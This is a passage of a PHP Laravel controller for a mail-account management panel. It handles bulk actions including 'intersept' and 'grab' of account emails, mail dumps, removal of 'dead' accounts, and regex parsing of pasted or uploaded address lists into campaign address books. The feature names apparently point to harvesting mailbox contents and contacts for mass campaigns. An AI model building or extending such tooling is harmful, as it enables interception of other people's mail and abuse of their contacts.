            MailAccount::whereIn('id', $ids)->update(array('enabled' => 0));
        }elseif( $action == 'clear_addressbook' ){
            CampaignAddressbook::whereIn('mail_account_id', $ids)->update(['mail_account_id' => null]);
            MailDump::whereIn('mail_account_id', $ids)->delete();
            MailAccountAddressBook::whereIn('email_account_id', $ids)->delete();
            MailAccount::whereIn('id', $ids)->update(array('has_errors' => 0, 'error_log' => '', 'error_at' => null));
        }elseif ($action == 'delete') {
            CampaignAddressbook::whereIn('mail_account_id', $ids)->update(['mail_account_id' => null]);
            MailDump::whereIn('mail_account_id', $ids)->delete();
            MailAccountAddressBook::whereIn('email_account_id', $ids)->delete();
            MailAccount::whereIn('id', $ids)->delete();
        }elseif ($action == 'intersept') {
            MailAccount::whereIn('id', $ids)->update(array('intersept' => 1));
        }elseif ($action == 'grab') {
            MailAccount::whereIn('id', $ids)->update(array('need_grab_emails' => 1));
        }elseif ($action == 'stop-grab') {
            MailAccount::whereIn('id', $ids)->update(array('need_grab_emails' => 2));
        }elseif ($action == 'check-immediate') {
            MailAccount::whereIn('id', $ids)->update(array('check_immediate' => 1));
        }elseif ($action == 'remove-check-immediate') {
            MailAccount::whereIn('id', $ids)->update(array('check_immediate' => 0));
        }elseif ($action == 'change-group') {
            MailAccount::whereIn('id', $ids)->update(array('group' => $this->request->input('group')));
        }elseif ($action == 'remove-all-dead') {
            // firstly get all dead
            $mac_ids = MailAccount::where('alive', false)->pluck('id')->toArray();
            CampaignAddressbook::whereIn('mail_account_id', $mac_ids)->update(['mail_account_id' => null]);
            MailDump::whereIn('mail_account_id', $mac_ids)->delete();
            MailAccountAddressBook::whereIn('email_account_id', $mac_ids)->delete();
            MailAccount::whereIn('id', $mac_ids)->delete();
        }

        return response()->json(['success' => true, 'message' => 'Changes applied.']);

    }

    // update name for adressbook record
    public function updateHolderField($id){
        $mail = MailAccountAddressBook::where('id', $id)->first();
        if(is_null($mail)){
            return response()->json(['success' => false, 'message' => 'Addressbook record not found.']);
        }

        $new_name = $this->request->input('name');
        $new_company = $this->request->input('company');
        $new_rest = $this->request->input('rest');

        if( !empty($new_name) ){
            $mail->name = $new_name;
        }
        else if( !empty($new_company) ){
            $mail->company = $new_company;
        }
        else if( !empty($new_rest) ){
            $mail->rest = $new_rest;
        }

        $mail->save();

        return response()->json(['success' => true, 'message' => 'Addressbook record updated.']);

    }

    // update name for mail account record
    public function name($id)
    {
        $new_name = $this->request->input('new_name');
        if(empty($new_name))
            $new_name = '';

        MailAccount::where('id', $id)->update(array('name' => $new_name, 'auto_update_name' => 0));

        return response()->json(['success' => true, 'message' => 'Account record name updated.']);
    }

    // update name for mail account record
    public function from_mail($id)
    {
        $from_mail = $this->request->input('new_from_mail');
        if(empty($from_mail))
            $from_mail = 'none';

        MailAccount::where('id', $id)->update(['from_mail' => $from_mail]);

        return response()->json(['success' => true, 'message' => 'Account record from_mail updated.']);
    }

    private function processNewAddressRecords($id, $addrs_raw, $parse_rules, $scan_regex="")
    {
        $mail_preset = "(?P<mail>(?:[a-z0-9!#$%&'*+\/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+\/=?^_`{|}~-]+)*|\"(?:[\\x01-\\x08\\x0b\\x0c\\x0e-\\x1f\\x21\\x23-\\x5b\\x5d-\\x7f]|\\[\\x01-\\x09\\x0b\\x0c\\x0e-\\x7f])*\")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9]))\.){3}(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9])|[a-z0-9-]*[a-z0-9]:(?:[\\x01-\\x08\\x0b\\x0c\\x0e-\\x1f\\x21-\\x5a\\x53-\\x7f]|\\[\\x01-\\x09\\x0b\\x0c\\x0e-\\x7f])+)\]))";
        $name_preset = "(?P<name>[\w\s(\"\')?]+)?";
        $company_preset = "(?P<company>[\w\s(\"\')?]+)?";
        $rest_preset = "(?P<rest>[\w\s(\"\')?]+)?";
        $now = Carbon::now();

        // create regexp from parse_rules
        // stop0: remove whitespaces from string
        $parse_rules = preg_replace("/\s/", "", $parse_rules);
        // step1: replace delimiters with (\s?delimiter\s?) four backslashes are needed for escape value of $1
        # $data = preg_replace("/(?:\])(.*?)(?:\[)/", "](\s?\\\\$1\s?)[", $parse_rules);
        $data = preg_replace_callback(
            "/(?:\])\s?(\S*?)\s?(?:\[)/",
            function($matches){
                // check if matches is empty
                if(empty($matches[1]))
                    return '](\s)[';
                else
                    return '](\s?\\'.$matches[1].'\s?)[';
            },
            $parse_rules
        );
        // spet2: replace email with pattern
        $data = preg_replace("/\[e?mail\]/", $mail_preset, $data);
        // step3: replace name with pattern
        $data = preg_replace("/\[name\]/", $name_preset, $data);
        // step4: replace company with pattern
        $data = preg_replace("/\[company\]/", $company_preset, $data);
        // step5: replace rest with pattern
        $data = preg_replace("/\[rest\]/", $rest_preset, $data);

        $parse_regex = "/".$data."/";
        $addr_list = explode("\n", $addrs_raw);
        \Log::debug("Account add mails, parse regex:$parse_regex");

        $addrs = [];
        foreach ($addr_list as $record) {
            if( empty($record) ) continue;

            preg_match_all($parse_regex, $record, $matches);
            \Log::debug("Processing record:{$record}\n" . json_encode($matches));
            // skip record if no mail found
            $address = array_key_exists("mail", $matches) && !empty($matches['mail']) ? $matches['mail'][0] : "";

            if(empty($address)){
                \Log::debug("Skip. Reason: can't get email from record:{$record}");
                continue;
            }

            // check for scan rules
            if(!empty($scan_regex)){
                if( preg_match($scan_regex, $address) ){
                    \Log::debug("Record:$address\nRule:$scan_regex\nFound forbidden match in adding new email record. Skip.");
                    continue;
                }
            }

            $addrs[] = [
                "address" => $address,
                "name" => array_key_exists("name", $matches) && !empty($matches['name'][0]) ? trim($matches['name'][0]) : "",
                "company" => array_key_exists("company", $matches)  && !empty($matches['company'][0]) ? trim($matches['company'][0]) : "",
                "rest" => array_key_exists("rest", $matches)  && !empty($matches['rest'][0]) ? trim($matches['rest'][0]) : "",
                "email_account_id" => $id,
            ];
        }

        return $addrs;

    }

    // add new addresses for email_account
    public function addAddresses($id)
    {
        $parse_rules = $this->request->input('parse_rules');//"[email]|[name] , [company]";

        if(empty(trim($parse_rules))){
            return response()->json(['success' => false, 'message' => 'Please select proper parse rule.' ]);
        }

        $addrs_raw = $this->request->input('new_addresses');

        $selected_filters = empty($this->request->input('selected_filters')) ? [] : $this->request->input('selected_filters');

        $scan_rules = ScanRules::select('rule')->where('enabled', 1)->whereIn('group', $selected_filters)->distinct()->get();

        $scan_regex = "";
        // hope if there will be 100+ rules, this regex will not fail...
        if($scan_rules->count()){
            $scan_regex = "/" . $scan_rules->map(function($item){ return "($item->rule)"; })->implode('|') . "/i";
            \Log::debug("Add emails exclude rule:" . $scan_regex);
        }


        $data = [];
        // process textarea
        if(!empty($addrs_raw)){
            \Log::debug( "processing textarea records:");
            $data = $this->processNewAddressRecords($id, $addrs_raw, $parse_rules, $scan_regex);
            \Log::debug( "textarea records:" . json_encode($data));
        }

        // file_list
        if(!empty($this->request->file_list)){
            \Log::debug( "processing file records:");
            foreach ($this->request->file_list as $file) {
                $filepath = $file->path();
                $addrs_raw = file_get_contents($filepath);
                $items = $this->processNewAddressRecords($id, $addrs_raw, $parse_rules, $scan_regex);
                $data = array_merge($data, $items);
            }
        }

        \Log::debug( "addAddresses total add:" . json_encode($data) );

        $res = MailAccountAddressBook::insertIgnore($data);
        return response()->json(['success' => true, 'message' => 'New email addresses inserted for account '.$id ]);
    }

    public function mailDumpDetails($id){
        $mail = MailDump::where('id',$id)->first();
        if( is_null($mail) ){
            return response()->json(['success' => false, 'message' => 'Not found mail with id:'.$id ]);
        }else{
            return response()->json(['success' => true, 'message' => '', 'data' => $mail ]);
        }
    }

}
